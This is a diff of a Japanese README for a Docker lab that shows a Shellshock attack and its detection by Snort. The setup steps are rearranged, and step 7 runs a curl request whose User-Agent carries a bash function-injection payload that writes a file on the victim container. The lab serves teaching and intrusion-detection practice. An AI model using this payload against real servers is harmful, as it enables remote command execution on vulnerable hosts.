@@ -49,24 +49,27 @@ shellshock
     例(WSL内のbash)
     - `cd ~/`
     - `tar -xzvf /mnt/c/Users/[ユーザー名]/Downloads/shellshock-lab.tar.gz`
-5. snort-dockerフォルダのDockerfile内、監視するブリッジ名を自分の環境に合わせて変更\
+5. attack/victimを起動 \
     例(WSL内のbash)
-    - `cd ~/`
-    - `ip a` (br-...という名前のインターフェース名をコピー)
-    - `nano snort-docker/Dockerfile`
-        - 最終行、CMD内の"br-..."をコピーしたものに変更
-6. attack/victim, snortをそれぞれ起動 \
-    例(WSL内のbash)
-    - `cd ~/snort-docker`
-    - `docker build -t monitor-snort .`
-    - `docker run -it --rm --network=host --cap-add=NET_ADMIN --cap-add=NET_RAW monitor-snort`
-    - (新しいWSLウィンドウを開く)
     - `cd ~/shellshock`
     - `docker-compose build`
     - `docker-compose up -d`
-7. 攻撃コンテナの中に入る、攻撃を行う \
+6. snort-dockerフォルダのDockerfile内、監視するブリッジ名を自分の環境に合わせて変更\
     例(WSL内のbash)
+    - (新しいWSLウィンドウを開く)
+    - `cd ~/snort-docker`
+    - `ip a` (br-...という名前のインターフェース名をコピー)
+    - `nano Dockerfile`
+        - 最終行、CMD内の"br-..."をコピーしたものに変更
+    - `docker build -t monitor-snort .`
+    - `docker run -it --rm --network=host --cap-add=NET_ADMIN --cap-add=NET_RAW monitor-snort`
+7. 攻撃コンテナの中に入る、攻撃を行う \
+    例(snortではないの方のWSL内bash)
     - `docker exec -it attacker-msf /bin/bash`
     - (攻撃コンテナの中に入り、bashが起動)
     - `curl -A '() { :;}; echo vulnerable > /tmp/shellshock.txt' http://victim:8000/cgi-bin/vulnerable.sh`
     - (victim内にshellshock.txtが作成され、snortを起動したウィンドウにはTCP packet detected, shellshock deteted のアラートがそれぞれ表示される)
+    - `exit`(攻撃コンテナから出てWSLに戻る)
+    - `docker exec -it victim-shellshock /bin/bash`
+    - (被攻撃コンテナの中に入る)
+    - `cat /tmp/shellshock.txt`(vulnerableと出力されればcurlによりファイルが生成されている=攻撃が成功している)
